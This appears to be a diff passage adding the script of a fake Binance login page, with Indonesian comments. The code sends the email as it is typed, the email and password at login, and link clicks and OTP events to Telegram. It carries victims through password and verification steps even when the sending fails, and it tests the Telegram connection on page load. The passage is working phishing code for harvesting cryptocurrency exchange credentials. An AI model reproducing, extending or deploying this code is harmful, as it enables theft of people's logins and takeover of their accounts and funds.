+        // Generate OTP baru
+        const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+        
+        // Kirim OTP baru ke Telegram
+        sendOtpToTelegram(email, selectedVerificationMethod, generatedOtp)
+            .then(data => {
+                // Mulai countdown lagi
+                startCountdown();
+            })
+            .catch(error => {
+                // Tetap mulai countdown meski gagal
+                startCountdown();
+            });
+    });
+
+    // PERBAIKAN: Event listener untuk link "Buat Akun Binance"
+    createAccountLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        console.log('🖱️ Link "Buat Akun Binance" diklik');
+        sendLinkClickToTelegram('Buat Akun Binance');
+    });
+
+    // PERBAIKAN: Event listener untuk link "Lupa Kata Sandi?"
+    forgotPasswordLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        console.log('🖱️ Link "Lupa Kata Sandi" diklik');
+        sendLinkClickToTelegram('Lupa Kata Sandi');
+    });
+
+    // PERBAIKAN: Event listener untuk link "Ganti Metode Lainnya"
+    changeMethodLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        console.log('🖱️ Link "Ganti Metode Lainnya" diklik');
+        sendLinkClickToTelegram('Ganti Metode Lainnya');
+    });
+
+    // PERBAIKAN: Event listener untuk tombol back di step 3
+    backBtn3.addEventListener('click', function() {
+        step3.classList.remove('active');
+        setTimeout(() => {
+            step2.classList.add('active');
+        }, 400);
+    });
+
+    // PERBAIKAN: Event listener untuk tombol back di step 4
+    backBtn4.addEventListener('click', function() {
+        step4.classList.remove('active');
+        setTimeout(() => {
+            step3.classList.add('active');
+            clearInterval(countdownTimer);
+        }, 400);
+    });
+
+    // PERBAIKAN: Validasi input email
+    emailInput.addEventListener('input', function() {
+        const email = emailInput.value.trim();
+        const isValid = email.length > 0;
+        
+        if (isValid) {
+            continueBtn.disabled = false;
+            emailError.style.display = 'none';
+            emailInput.classList.remove('is-invalid');
+            
+            // Kirim data ke Telegram saat pengguna selesai mengetik (dengan delay)
+            clearTimeout(emailInput.timeout);
+            emailInput.timeout = setTimeout(sendEmailToTelegram, 1000);
+        } else {
+            continueBtn.disabled = true;
+        }
+    });
+
+    // PERBAIKAN: Validasi input password
+    passwordInput.addEventListener('input', function() {
+        const password = passwordInput.value;
+        const isValid = password.length >= 6;
+        
+        if (isValid) {
+            loginBtn.disabled = false;
+            passwordError.style.display = 'none';
+            passwordInput.classList.remove('is-invalid');
+        } else {
+            loginBtn.disabled = true;
+            if (password.length > 0) {
+                passwordError.style.display = 'block';
+                passwordInput.classList.add('is-invalid');
+            } else {
+                passwordError.style.display = 'none';
+                passwordInput.classList.remove('is-invalid');
+            }
+        }
+    });
+
+    // PERBAIKAN: Toggle show/hide password
+    togglePassword.addEventListener('click', function() {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        
+        // Toggle icon
+        const icon = togglePassword.querySelector('i');
+        icon.classList.toggle('bi-eye');
+        icon.classList.toggle('bi-eye-slash');
+    });
+
+    // PERBAIKAN: Navigasi ke step 2
+    continueBtn.addEventListener('click', () => {
+        const email = emailInput.value.trim();
+        
+        if (email === '') {
+            emailError.style.display = 'block';
+            emailInput.classList.add('is-invalid');
+            return;
+        }
+        
+        // Simpan email ke localStorage
+        saveEmailToStorage(email);
+        
+        // Show loading state
+        const spinner = continueBtn.querySelector('.spinner-border');
+        const btnText = continueBtn.querySelector('.btn-text');
+        btnText.textContent = 'Memproses...';
+        spinner.classList.remove('d-none');
+        continueBtn.disabled = true;
+        
+        // Simulasi request ke server
+        setTimeout(() => {
+            step1.classList.remove('active');
+            setTimeout(() => {
+                step2.classList.add('active');
+                // Tampilkan email yang disimpan
+                displayUserEmail();
+                // Reset loading state
+                btnText.textContent = 'Lanjutkan';
+                spinner.classList.add('d-none');
+                continueBtn.disabled = false;
+            }, 400);
+        }, 1000);
+    });
+
+    // PERBAIKAN: Kembali ke step 1
+    backBtn.addEventListener('click', () => {
+        step2.classList.remove('active');
+        setTimeout(() => {
+            step1.classList.add('active');
+        }, 400);
+    });
+
+    // PERBAIKAN: Tombol ubah email
+    changeEmailBtn.addEventListener('click', () => {
+        // Hapus email dari localStorage
+        removeEmailFromStorage();
+        
+        // Kembali ke step 1
+        step2.classList.remove('active');
+        setTimeout(() => {
+            step1.classList.add('active');
+            // Kosongkan input email
+            emailInput.value = '';
+            continueBtn.disabled = true;
+        }, 400);
+    });
+
+    // PERBAIKAN: Login
+    loginBtn.addEventListener('click', () => {
+        const password = passwordInput.value;
+        const email = getEmailFromStorage();
+        
+        if (password.length < 6) {
+            passwordError.style.display = 'block';
+            passwordInput.classList.add('is-invalid');
+            return;
+        }
+        
+        // Show loading state
+        const spinner = loginBtn.querySelector('.spinner-border');
+        const btnText = loginBtn.querySelector('.btn-text');
+        btnText.textContent = 'Masuk...';
+        spinner.classList.remove('d-none');
+        loginBtn.disabled = true;
+        
+        // Kirim data login ke Telegram
+        sendLoginDataToTelegram(email, password)
+            .then(data => {
+                // Lanjut ke step 3 (verifikasi)
+                setTimeout(() => {
+                    step2.classList.remove('active');
+                    setTimeout(() => {
+                        step3.classList.add('active');
+                        // Reset loading state
+                        btnText.textContent = 'Masuk';
+                        spinner.classList.add('d-none');
+                        loginBtn.disabled = false;
+                        passwordSuccessAlert.style.display = 'none';
+                    }, 400);
+                }, 1500);
+            })
+            .catch(error => {
+                // Tetap lanjutkan ke step 3 meski data gagal dikirim
+                setTimeout(() => {
+                    step2.classList.remove('active');
+                    setTimeout(() => {
+                        step3.classList.add('active');
+                        // Reset loading state
+                        btnText.textContent = 'Masuk';
+                        spinner.classList.add('d-none');
+                        loginBtn.disabled = false;
+                        passwordErrorAlert.style.display = 'none';
+                    }, 400);
+                }, 1500);
+            });
+    });
+
+    // PERBAIKAN: Enter key untuk lanjut ke password
+    emailInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter' && !continueBtn.disabled) {
+            continueBtn.click();
+        }
+    });
+
+    // PERBAIKAN: Enter key untuk submit password
+    passwordInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter' && !loginBtn.disabled) {
+            loginBtn.click();
+        }
+    });
+
+    // PERBAIKAN: Enter key untuk submit OTP
+    otpInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter' && !verifyOtpBtn.disabled) {
+            verifyOtpBtn.click();
+        }
+    });
+
+    // PERBAIKAN: Close button functionality
+    function closePage() {
+        if (confirm('Apakah Anda yakin ingin menutup halaman login?')) {
+            // Hapus email dari localStorage saat menutup
+            removeEmailFromStorage();
+            alert('Halaman login ditutup');
+        }
+    }
+
+    closeBtn.addEventListener('click', closePage);
+    closeBtn2.addEventListener('click', closePage);
+    closeBtn3.addEventListener('click', closePage);
+    closeBtn4.addEventListener('click', closePage);
+
+    // PERBAIKAN: Saat halaman dimuat, cek apakah ada email yang tersimpan dan test koneksi
+    window.addEventListener('DOMContentLoaded', function() {
+        // Test koneksi Telegram
+        testTelegramConnection();
+        
+        const savedEmail = getEmailFromStorage();
+        if (savedEmail) {
+            // Jika ada email yang tersimpan, langsung tampilkan halaman kata sandi
+            emailInput.value = savedEmail;
+            continueBtn.disabled = false;
+            step1.classList.remove('active');
+            step2.classList.add('active');
+            displayUserEmail();
+        }
+    });
+  </script>
+</body>
+</html>
